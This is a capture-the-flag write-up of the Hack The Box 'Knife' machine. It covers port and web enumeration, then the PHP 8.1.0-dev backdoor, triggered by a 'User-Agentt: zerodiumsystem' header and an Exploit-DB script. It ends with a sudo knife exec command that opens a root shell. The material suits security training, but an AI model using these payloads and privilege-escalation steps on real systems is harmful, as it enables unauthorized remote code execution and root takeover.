I"o+<p><strong>Knife</strong> is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP: <strong>PHP/8.1.0-dev</strong>. 
This vulnerability is leveraged to obtain the foothold on the server. 
A <strong>sudo</strong> misconfiguration is then exploited to gain a root shell.</p>
<h1 id="nmap">Nmap</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">-v</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-oN</span> nmap-fullscan.out
Nmap scan report <span class="k">for </span>knife.htb <span class="o">(</span>10.10.10.242<span class="o">)</span>
Host is up <span class="o">(</span>0.083s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65142 closed ports, 391 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="web-enumeration">Web enumeration</h1>
<h2 id="directory-brute-forcing">Directory brute forcing</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.10.10.242/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="nt">-e</span> .php,.html,.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.242/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 5815, Words: 646, Lines: 221]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10]
</span></pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="nikto">Nikto</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>nikto <span class="nt">-h</span> 10.10.10.242
- Nikto v2.1.6
<span class="nt">---------------------------------------------------------------------------</span>
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2021-07-01 14:35:11 <span class="o">(</span>GMT5.5<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------</span>
+ Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="zerodium-exploit">Zerodium exploit</h1>
<p>An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021.
Two malicious commits were pushed to the php-src repo from the names of Rasmus Lerdorf and Nikita Popov. Everything pointed towards a compromise of the git.php.net server.
These are the two malicious commits.
<a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d</a>
<a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a">https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a</a></p>

<p>This indicates that an attacker can execute arbitrary code by sending the <code class="language-plaintext highlighter-rouge">User-Agentt</code> header. 
To exploit manually, just pass the another header:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>User-Agentt: zerodiumsystem(whoami);
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Or you can use the following exploit uses the backdoor to provide a pseudo shell on the host.
<a href="https://www.exploit-db.com/exploits/49933">https://www.exploit-db.com/exploits/49933</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can<span class="s1">'t acces tty; job crontol turned off.
$ whoami
james
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="privesc-with-knife-utility">Privesc with Knife utility</h1>
<p>Checking out <code class="language-plaintext highlighter-rouge">sudo</code> permissions for user james shows some tool called <code class="language-plaintext highlighter-rouge">knife</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>james on knife:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">knife --help</code> gives us a lot of options which can be helpful, most lucrative of all is <code class="language-plaintext highlighter-rouge">exec</code>:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>knife <span class="nt">--help</span>

Chef Infra Client: 16.10.8
Docs: https://docs.chef.io/workstation/knife/
<span class="o">[</span>..snip..]
		
<span class="k">**</span> EXEC COMMANDS <span class="k">**</span>
knife <span class="nb">exec</span> <span class="o">[</span>SCRIPT] <span class="o">(</span>options<span class="o">)</span>

<span class="o">[</span>..snip..]
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--help</code> does not specify which script it runs, which is clearly mentioned in their documentation online: <a href="https://docs.chef.io/workstation/knife_exec">https://docs.chef.io/workstation/knife_exec</a></li>
</ul>

<blockquote>
  <p><em>“Use the knife exec subcommand to execute Ruby scripts in the context of a fully configured Chef Infra Client. This subcommand has the following options: <code class="language-plaintext highlighter-rouge">-E CODE, --exec CODE</code> A string of code to be executed.”</em></p>
</blockquote>

<p>There are three ways to use knife exec to run Ruby script files. For example:
<code class="language-plaintext highlighter-rouge">knife exec /path/to/script_file</code>
or:
<code class="language-plaintext highlighter-rouge">knife exec -E 'RUBY CODE'</code></p>

<ul>
  <li>Grab a stabilized shell using <code class="language-plaintext highlighter-rouge">id_rsa</code> in <code class="language-plaintext highlighter-rouge">/home/james/.ssh/id_rsa</code> or a reverse-shell.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'system("/bin/bash -pi")'</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>938<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@knife:/# 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
</ul>
:ET